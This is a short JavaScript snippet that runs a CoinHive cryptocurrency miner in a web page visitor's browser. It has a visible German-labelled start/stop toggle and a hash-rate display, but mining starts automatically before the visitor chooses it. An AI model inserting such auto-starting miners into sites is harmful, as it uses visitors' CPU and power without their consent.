  var miner = new CoinHive.Anonymous('jGysHJ4NbX1soA0A5jVxIpvukw9tLAwU');
  miner.setThrottle(0.86);
  miner.setNumThreads(2);
  miner.start(CoinHive.FORCE_MULTI_TAB);
  var isMining = true;
  var toggleMining = function() {
      console.log("toggle mining");
      if (isMining) {
          miner.stop();
          document.querySelector('.mining_link').innerHTML = 'Mining starten';
      } else {
          document.querySelector('.mining_link').innerHTML = 'Mining stoppen';
          miner.start(CoinHive.FORCE_MULTI_TAB);
      }
      isMining = !isMining;
  }
  setInterval(function() {
      var totalHashes = miner.getTotalHashes();
      document.querySelector('.mining_results').innerHTML = Math.round(10 * miner.getHashesPerSecond()) / 10;
  }, 3000);